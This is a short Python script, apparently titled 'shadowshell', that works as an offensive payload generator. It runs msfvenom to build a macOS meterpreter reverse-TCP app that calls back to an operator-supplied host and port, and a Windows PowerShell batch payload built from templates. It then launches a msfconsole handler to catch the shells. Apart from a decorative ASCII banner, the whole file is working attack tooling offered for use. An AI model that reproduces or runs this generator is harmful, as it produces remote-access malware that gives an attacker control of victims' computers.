"""
----------------------------------------
# shadowshell - custom payload generator
----------------------------------------
"""
__author__ = "z0nd3rl1ng"
__version__ = "0.1.1"

import os, random

def menu():
    banner()
    print("─╼┤ARCHITECTURE├───────────────────────────────────\n")
    print("\t(1) osx-app payload")
    print("\t(2) powershell payload\n")
    mode = input("────╼┤SELECTION├─> ")
    payloadGenerator(mode)

def payloadGenerator(mode):        
    if mode == "1":
	    host = input("─────────╼┤HOST├─> ")
	    port = input("─────────╼┤PORT├─> ")
	    print("\n")
	    command = "sudo msfvenom -p osx/x64/meterpreter/reverse_tcp_uuid LHOST="+host+" LPORT="+port+" -a x64 --platform osx -f osx-app -o shadowpacked.zip"
	    os.system(command)
        
    elif mode == "2":
        print("────╼┤TEMPLATES├──────────────────────────────────────\n")
        os.system("ls templates")
        template = input("\n────╼┤SELECTION├─> ")
        print("\n")
        command = "sudo msfvenom -p generic/custom PAYLOADFILE=templates/"+template+" -a x86 --platform win -e psbase NOEXIT SYSWOW64 -o shadowpower.bat"
        os.system(command)
        
    print("\n")
    handler = input("─╼┤HANDLER(Y/n)├─> ")
    if handler == "y":
        launchHandler()
    elif handler == "Y":
        launchHandler()
    else:
        exit()
    
def launchHandler():
    print("\n")
    command = "msfconsole -r handler.conf"
    os.system(command)
    
def banner():

	padding = '  '
	S = [[' ','┌','─','┐'],
	     [' ','└','─','┐'],
	     [' ','└','─','┘']]
	H = [[' ','┬',' ','┬'],
	     [' ','├','─','┤'],
	     [' ','┴',' ','┴']]
	A = [[' ','┌','─','┐'],
	     [' ','├','─','┤'],
	     [' ','┴',' ','┴']]
	D = [[' ','┬','─','┐'],
	     [' ','│',' ','│'],
	     [' ','┴','─','┘']]
	O = [[' ','┌','─','┐'],
	     [' ','│',' ','│'],
	     [' ','└','─','┘']]
	W = [[' ','┬',' ',' ','┬'],
	     [' ','│','┌','┐','│'],
	     [' ','└','┘','└','┘']]
	E = [[' ','┌','─','┐'],
	     [' ','├','┤',' '],
	     [' ','└','─','┘']]
	L = [[' ','┬',' ',' '],
	     [' ','│',' ',' '],
	     [' ','┴','─','┘']]
	
	banner = [S,H,A,D,O,W,S,H,E,L,L]
	final = []
	print('\r')
	init_color = random.randint(10,40)
	txt_color = init_color
	cl = 0

	for charset in range(0, 3):
		for pos in range(0, len(banner)):
			for i in range(0, len(banner[pos][charset])):
				clr = f'\033[38;5;{txt_color}m'
				char = f'{clr}{banner[pos][charset][i]}'
				final.append(char)
				cl += 1
				txt_color = txt_color + 36 if cl <= 3 else txt_color

			cl = 0

			txt_color = init_color
		init_color += 31

		if charset < 2: final.append('\n   ')

	print(f"   {''.join(final)}")
	print(f'{padding}                 by z0nd3rl1ng\n')

if __name__ == "__main__":
	menu()
